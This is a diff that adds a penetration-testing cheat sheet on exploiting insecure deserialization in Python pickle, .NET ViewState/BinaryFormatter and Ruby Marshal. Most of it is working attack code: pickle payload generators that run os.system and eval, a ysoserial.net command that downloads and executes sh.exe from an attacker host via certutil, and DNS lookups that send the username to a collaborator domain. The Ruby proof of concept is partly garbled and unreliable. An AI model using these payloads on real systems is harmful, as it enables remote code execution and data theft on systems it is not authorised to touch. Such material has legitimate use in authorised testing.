@@ -1,0 +1,90 @@
+# Python Pickle & .NET / Ruby Deserialization
+
+## PYTHON PICKLE
+### Detection
+- Request value begins with pickle protocol marker bytes:
+  - `\x80\x04\x95...`  (Py3 protocol 4)
+  - `\x80\x03...`
+  - `(S'name'\nI1\ntp.` (protocol 0 text)
+- Common in Flask `session` cookie (though that's JWT-signed sidecar — if SESSION cook is `eyJ...` it's base64 not pickle; `_sess` in some frameworks IS pickle).
+- Any API param named `pickle`, `blob`, `data`, `payload`
+
+### PoC (generate a bad pickle — "opcode" malware)
+```python
+import pickle, os, base64
+
+class RCE:
+    def __reduce__(self):
+        return (os.system, ("id",))
+
+payload = base64.b64encode(pickle.dumps(RCE()))
+print(payload)
+```
+Send as cookie/body. Blind: `os.system("nslookup COLLAB.oastify.com")`.
+
+### In-band test
+```python
+import pickle, base64
+class P:
+    def __reduce__(self):
+        return (eval, ("__import__('os').popen('id').read()",))
+print(base64.b64encode(pickle.dumps(P())).decode())
+```
+If response echoes the object repr → you get command output directly.
+
+### What if base64 only?
+App then `base64.b64decode(...)` + `pickle.loads(...)`: works with the above.
+
+## .NET (ViewState / ObjectStateFormatter / BinaryFormatter)
+### Detection
+- `__VIEWSTATE` begins with base64 that decodes to `\xff\x01` (BinaryFormatter) or gzip'd
+- ASP.NET params: `ViewState`, `__EVENTTARGET` combo
+
+### Exploit requires the MachineKey
+- In `web.config`: `<machineKey validationKey="..." decryptionKey="..." validation="..." >`
+- If key leaked via backup/config disclosure → use `ysoserial.net`:
+```powershell
+ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c certutil -urlcache -split -f http://ATTACKER/sh.exe %TEMP%\sh.exe&%TEMP%\sh.exe" --validationalg="SHA1/AES" --validationkey="KEY" --decryptionalg="..." --decryptionkey="KEY"
+```
+
+### BinaryFormatter (web.config `httpRuntime targetFramework` old)
+- Cookie/body in `BinaryFormatter` — test with ysoserial.net if you have `MachineKey`.
+
+## RUBY (Marshal)
+### Detection
+- Starts with `\x04\x08o:\x1c...` (pos 4=`o`, object)
+- or base64 of it
+- parses `Marshal.load`
+
+### PoC
+```ruby
+require 'base64'
+payload = Marshal.dump((RUBY_VERSION.to_f >= 2.0 ? "id" : "") + "\x00")
+# real RCE via ERB:
+class ErbRCE
+  def initialize()
+    @x = eval("`id`")
+  end
+end
+puts Base64.strict_encode64(Marshal.dump(ErbRCE.new()))
+```
+Send into endpoints that `Marshal.load` params.
+
+## JAVA-ish fallback (generic marker test)
+Send these as cookie values and watch for stack trace vs 200:
+```
+rO0ABXQAT..., aced0005...,  AC ED 00 05 (hex)
+pickle: \x80\x04, marshal: \x04\x08, php: O:...
+```
+
+## EXFILTRATION FALLBACK (no shell)
+Use DNS-based blind when no output channel:
+```
+# python: os.system(f'nslookup {os.getlogin()}.COLLAB.oastify.com')
+# ruby:   `ping COLLAB.oastify.com`
+# java:   URLDNS / JRMPClient
+```
+Watch collaborator / dnslog.
+
+## Reporting
+Pickle/Marshal/BinaryFormatter with an RCE gadget is always critical. Show raw encoded payload + the output you received (or collaborator hit).
